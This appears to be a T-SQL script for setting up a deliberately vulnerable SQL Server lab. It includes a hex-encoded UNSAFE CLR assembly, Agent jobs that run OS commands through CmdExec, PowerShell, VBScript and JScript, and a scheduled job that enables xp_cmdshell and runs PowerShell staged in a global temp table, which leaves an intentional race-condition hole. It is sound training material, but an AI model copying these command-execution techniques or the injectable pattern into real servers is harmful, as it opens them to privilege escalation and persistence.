6D65436F6D7061746962696C697479417474726962757465004D6963726F736F66742E53716C5365727665722E5365727665720053716C50726F636564757265417474726962757465006765745F56616C756500537472696E6700466F726D61740053716C4D657461446174610053716C4462547970650053716C446174615265636F72640053716C436F6E746578740053716C50697065006765745F506970650053656E64526573756C7473537461727400536574537472696E670053656E64526573756C7473526F770053656E64526573756C7473456E6400457863657074696F6E006765745F4D65737361676500436F6E736F6C650057726974654C696E650049734E756C6C4F72456D70747900417267756D656E744E756C6C457863657074696F6E0053797374656D2E53656375726974792E43727970746F677261706879005266633238393844657269766542797465730052696A6E6461656C4D616E616765640053796D6D6574726963416C676F726974686D006765745F4B657953697A65004465726976654279746573004765744279746573007365745F4B6579004369706865724D6F6465007365745F4D6F6465006765745F4B6579006765745F4956004943727970746F5472616E73666F726D00437265617465456E63727970746F72004D656D6F727953747265616D00426974436F6E7665727465720057726974650043727970746F53747265616D0043727970746F53747265616D4D6F64650053747265616D57726974657200546578745772697465720049446973706F7361626C6500446973706F736500546F417272617900436F6E7665727400546F426173653634537472696E6700436C6561720046726F6D426173653634537472696E67007365745F495600437265617465446563727970746F720053747265616D52656164657200546578745265616465720052656164546F456E64004279746500526561640053797374656D457863657074696F6E00546F496E743332002E6363746F720053797374656D2E5465787400456E636F64696E67006765745F556E69636F64650000000000276100650073006800690064006500740068006500620065006500660031003200330034003500000D6F007500740070007500740000154500720072006F0072003A0020007B0030007D00001370006C00610069006E0054006500780074000019730068006100720065006400530065006300720065007400001563006900700068006500720054006500780074000069530074007200650061006D00200064006900640020006E006F007400200063006F006E007400610069006E002000700072006F007000650072006C007900200066006F0072006D006100740074006500640020006200790074006500200061007200720061007900004144006900640020006E006F00740020007200650061006400200062007900740065002000610072007200610079002000700072006F007000650072006C00790000194300610070007400610069006E00530061006C007400790000009092612DC92C6841833C9171C7A25FBA0008B77A5C561934E08905000101110903061D050500020E0E0E0600011D05120D03200001042001010804010000000320000E0600020E0E1D1C072003010E11250A062001011D1221040000123105200101122905200201080E050002010E1C0A07040E122912351D1221040001020E042001010E062002010E1D05032000080520011D0508052001011D050520010111510420001D0508200212551D051D050500011D0508072003011D05080809200301120D1255116505200101120D0500010E1D051107090E1245124112551259126112690E020500011D050E13070A12450E12411D0512591255126112790E02072003081D050808060002081D05080907041D051D051D0502030000010500001280890520011D050E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301000000DC2F00000000000000000000FE2F0000002000000000000000000000000000000000000000000000F02F00000000000000000000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF2500200010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000004C02000000000000000000004C0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004AC010000010053007400720069006E006700460069006C00650049006E0066006F0000008801000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E00300000003C000E00010049006E007400650072006E0061006C004E0061006D006500000063006F006D006D006F006E006C00690062002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000044000E0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000063006F006D006D006F006E006C00690062002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000C000000103000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
WITH PERMISSION_SET = UNSAFE
GO

-- Map assembly method beefencrypt to procedure
CREATE PROCEDURE [dbo].[beefencrypt] @MyString NVARCHAR (4000) AS EXTERNAL NAME [commonlib].[commonlib].[beefencrypt];
GO

-- Map assembly method beefdencrypt to procedure
CREATE PROCEDURE [dbo].[beefdencrypt] @MyString NVARCHAR (4000) AS EXTERNAL NAME [commonlib].[commonlib].[beefencrypt];
GO

-- Run procedure
beefencrypt "hello there"
GO

-- Run procedure
beefdencrypt "EAAAAJVbaCaMSI3k1N99P31tP//K4WzvBUEaNW94Ed9yWyhB"
GO

----------------------------------------------------------------------
-- Create agent jobs that execute OS commands - CMDEXEC
----------------------------------------------------------------------

USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - CMDEXEC]    Script Date: 5/9/2024 9:12:13 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 5/9/2024 9:12:13 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - CMDEXEC', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=0, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=N'MSSQLSRV04\Administrator', @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [Run CMD]    Script Date: 5/9/2024 9:12:13 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Run CMD', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'CmdExec', 
		@command=N'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\artifact-cmd.txt', 
		@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'CmdDaily', 
		@enabled=1, 
		@freq_type=4, 
		@freq_interval=1, 
		@freq_subday_type=1, 
		@freq_subday_interval=0, 
		@freq_relative_interval=0, 
		@freq_recurrence_factor=0, 
		@active_start_date=20240509, 
		@active_end_date=99991231, 
		@active_start_time=0, 
		@active_end_time=235959, 
		@schedule_uid=N'11e6216d-c317-4cfd-81c9-053ad9b22dbc'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO

----------------------------------------------------------------------
-- Create agent jobs that execute OS commands - PowerShell
----------------------------------------------------------------------

USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - POWERSHELL]    Script Date: 5/9/2024 9:09:22 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 5/9/2024 9:09:22 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - POWERSHELL', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=0, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=N'MSSQLSRV04\Administrator', @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [Run PowerShell]    Script Date: 5/9/2024 9:09:22 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'Run PowerShell', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'PowerShell', 
		@command=N'"hello world" | out-file c:\windows\temp\artifact-powershell.txt', 
		@database_name=N'master', 
		@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'PowershellDaily', 
		@enabled=1, 
		@freq_type=4, 
		@freq_interval=1, 
		@freq_subday_type=1, 
		@freq_subday_interval=0, 
		@freq_relative_interval=0, 
		@freq_recurrence_factor=0, 
		@active_start_date=20240509, 
		@active_end_date=99991231, 
		@active_start_time=0, 
		@active_end_time=235959, 
		@schedule_uid=N'5040c673-1700-4296-a892-71e7140e1054'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO

----------------------------------------------------------------------
-- Create agent jobs that execute OS commands - ActiveX VBScript
----------------------------------------------------------------------

USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - ActiveX: VBSCRIPT]    Script Date: 5/9/2024 9:06:00 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 5/9/2024 9:06:00 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - ActiveX: VBSCRIPT1', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=0, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=N'MSSQLSRV04\Administrator', @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [RUN ActiveX: VBSCRIPT]    Script Date: 5/9/2024 9:06:00 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'RUN ActiveX: VBSCRIPT', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'ActiveScripting', 
		@command=N'FUNCTION Main()

dim shell
set shell= CreateObject ("WScript.Shell")
shell.run("c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\artifact-vbscript.txt")
set shell = nothing

END FUNCTION', 
		@database_name=N'VBScript', 
		@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'VBDaily', 
		@enabled=1, 
		@freq_type=4, 
		@freq_interval=1, 
		@freq_subday_type=1, 
		@freq_subday_interval=0, 
		@freq_relative_interval=0, 
		@freq_recurrence_factor=0, 
		@active_start_date=20240509, 
		@active_end_date=99991231, 
		@active_start_time=0, 
		@active_end_time=235959, 
		@schedule_uid=N'1572a7dc-cafb-4a4b-b92e-ed4715f154b0'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO
	
----------------------------------------------------------------------
-- Create agent jobs that execute OS commands - ActiveX JScript
----------------------------------------------------------------------

USE [msdb]
GO

/****** Object:  Job [OS COMMAND EXECUTION EXAMPLE - ActiveX: JSCRIPT]    Script Date: 8/29/2017 11:17:16 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 8/29/2017 11:17:16 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
DECLARE @user varchar(8000)
SET @user = SYSTEM_USER
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'OS COMMAND EXECUTION EXAMPLE - ActiveX: JSCRIPT', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=1, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=@user, @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [RUN COMMAND - ActiveX: JSCRIPT]    Script Date: 8/29/2017 11:17:16 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'RUN COMMAND - ActiveX: JSCRIPT', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'ActiveScripting', 
		@command=N'function RunCmd()
{
	var objShell = new ActiveXObject("shell.application");
        	objShell.ShellExecute("cmd.exe", "/c echo hello > c:\\windows\\temp\\artifact-jscript.txt", "", "open", 0);
 }

RunCmd();
', 
/** alternative option
		@command=N'function RunCmd()
					{
						 var WshShell = new ActiveXObject("WScript.Shell");  
						  var oExec = WshShell.Exec("c:\\windows\\system32\\cmd.exe /c echo hello > c:\\windows\\temp\\blah.txt"); 
						  oExec = null; 
						  WshShell = null; 
					 }

					RunCmd();
					', 

**/
		@database_name=N'JavaScript', 
		@flags=0
		--,@proxy_name=N'WinUser1'		
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO


use msdb
EXEC dbo.sp_start_job N'OS COMMAND EXECUTION EXAMPLE - ActiveX: JSCRIPT' ; 

----------------------------------------------------------------------
-- Create Global Temp Tables
----------------------------------------------------------------------

-- Create global temporary table
IF (OBJECT_ID('tempdb..##GlobalTempTbl') IS NULL)
CREATE TABLE ##GlobalTempTbl (Spy_id INT NOT NULL, SpyName text NOT NULL, RealName text NULL);
GO
	
-- Insert records global temporary table
INSERT INTO ##GlobalTempTbl (Spy_id, SpyName, RealName) VALUES (1,'Black Widow','Scarlett Johansson')
INSERT INTO ##GlobalTempTbl (Spy_id, SpyName, RealName) VALUES (2,'Ethan Hunt','Tom Cruise')
INSERT INTO ##GlobalTempTbl (Spy_id, SpyName, RealName) VALUES (3,'Evelyn Salt','Angelina Jolie')
INSERT INTO ##GlobalTempTbl (Spy_id, SpyName, RealName) VALUES (4,'James Bond','Sean Connery')
GO

------------------------------------------------------------
-- Create agent job that uses vulnerable global temp tables
------------------------------------------------------------

USE [msdb]
GO

/****** Object:  Job [Temp Table Race Condition]    Script Date: 5/9/2024 9:34:10 AM ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]    Script Date: 5/9/2024 9:34:10 AM ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END

DECLARE @jobId BINARY(16)
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'Temp Table Race Condition', 
		@enabled=1, 
		@notify_level_eventlog=0, 
		@notify_level_email=0, 
		@notify_level_netsend=0, 
		@notify_level_page=0, 
		@delete_level=0, 
		@description=N'No description available.', 
		@category_name=N'[Uncategorized (Local)]', 
		@owner_login_name=N'MSSQLSRV04\Administrator', @job_id = @jobId OUTPUT
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
/****** Object:  Step [run tsql]    Script Date: 5/9/2024 9:34:10 AM ******/
EXEC @ReturnCode = msdb.dbo.sp_add_jobstep @job_id=@jobId, @step_name=N'run tsql', 
		@step_id=1, 
		@cmdexec_success_code=0, 
		@on_success_action=1, 
		@on_success_step_id=0, 
		@on_fail_action=2, 
		@on_fail_step_id=0, 
		@retry_attempts=0, 
		@retry_interval=0, 
		@os_run_priority=0, @subsystem=N'TSQL', 
		@command=N'---------------------------------------
-- Script: writefile_bcpxpcmdshell.sql
-- Author/Modifications: Scott Sutherland
-- Based on https://www.simple-talk.com/sql/t-sql-programming/the-tsql-of-text-files/ 
-- Description:
-- Write PowerShell code to disk and run it using bcp and xp_cmdshell.
---------------------------------------

-- Enable xp_cmdshell
sp_configure ''show advanced options'',1
RECONFIGURE
GO

sp_configure ''xp_cmdshell'',1
RECONFIGURE
GO

-- Create variables
DECLARE @MyPowerShellCode NVARCHAR(MAX)
DECLARE @PsFileName NVARCHAR(4000)
DECLARE @TargetDirectory NVARCHAR(4000)
DECLARE @PsFilePath NVARCHAR(4000)
DECLARE @MyGlobalTempTable NVARCHAR(4000)
DECLARE @Command NVARCHAR(4000)

-- Set filename for PowerShell script
Set @PsFileName = ''MyPowerShellScript.ps1''

-- Set target directory for PowerShell script to be written to
SELECT  @TargetDirectory = REPLACE(CAST((SELECT SERVERPROPERTY(''ErrorLogFileName'')) as VARCHAR(MAX)),''ERRORLOG'','''')

-- Create full output path for creating the PowerShell script 
SELECT @PsFilePath = @TargetDirectory +  @PsFileName
SELECT @PsFilePath as PsFilePath

-- Define the PowerShell code
SET @MyPowerShellCode = ''Write-Output "hello world" | Out-File "'' +  @TargetDirectory + ''intendedoutput.txt"''
SELECT @MyPowerShellCode as PsScriptCode

-- Create a global temp table with a unique name using dynamic SQL 
SELECT  @MyGlobalTempTable =  ''##temp'' + CONVERT(VARCHAR(12), CONVERT(INT, RAND() * 1000000))

-- Create a command to insert the PowerShell code stored in the @MyPowerShellCode variable, into the global temp table
SELECT  @Command = ''
		CREATE TABLE ['' + @MyGlobalTempTable + ''](MyID int identity(1,1), PsCode varchar(MAX)) 
		INSERT INTO  ['' + @MyGlobalTempTable + ''](PsCode) 
		SELECT @MyPowerShellCode''
				
-- Execute that command 
EXECUTE sp_ExecuteSQL @command, N''@MyPowerShellCode varchar(MAX)'', @MyPowerShellCode

-- Execute bcp via xp_cmdshell (as the service account) to save the contents of the temp table to MyPowerShellScript.ps1
SELECT @Command = ''bcp "SELECT PsCode from ['' + @MyGlobalTempTable + '']'' + ''" queryout "''+ @PsFilePath + ''" -c -T -S '' + @@SERVERNAME

-- Write the file
EXECUTE MASTER..xp_cmdshell @command, NO_OUTPUT

-- Drop the global temp table
EXECUTE ( ''Drop table '' + @MyGlobalTempTable )

-- Run the PowerShell script
DECLARE @runcmdps nvarchar(4000)
SET @runcmdps = ''Powershell -C "$x = gc ''''''+ @PsFilePath + '''''';iex($X)"''
EXECUTE MASTER..xp_cmdshell @runcmdps, NO_OUTPUT

-- Delete the PowerShell script
DECLARE @runcmddel nvarchar(4000)
SET @runcmddel= ''DEL /Q "'' + @PsFilePath +''"''
-- EXECUTE MASTER..xp_cmdshell @runcmddel, NO_OUTPUT', 
		@database_name=N'master', 
		@flags=0
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_update_job @job_id = @jobId, @start_step_id = 1
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobschedule @job_id=@jobId, @name=N'RunDaily-TSQL', 
		@enabled=1, 
		@freq_type=4, 
		@freq_interval=1, 
		@freq_subday_type=4, 
		@freq_subday_interval=1, 
		@freq_relative_interval=0, 
		@freq_recurrence_factor=0, 
		@active_start_date=20240509, 
		@active_end_date=99991231, 
		@active_start_time=0, 
		@active_end_time=235959, 
		@schedule_uid=N'c06927ff-3307-4ca2-b17e-826e3c4942aa'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
EXEC @ReturnCode = msdb.dbo.sp_add_jobserver @job_id = @jobId, @server_name = N'(local)'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback
COMMIT TRANSACTION
GOTO EndSave
QuitWithRollback:
    IF (@@TRANCOUNT > 0) ROLLBACK TRANSACTION
EndSave:

GO





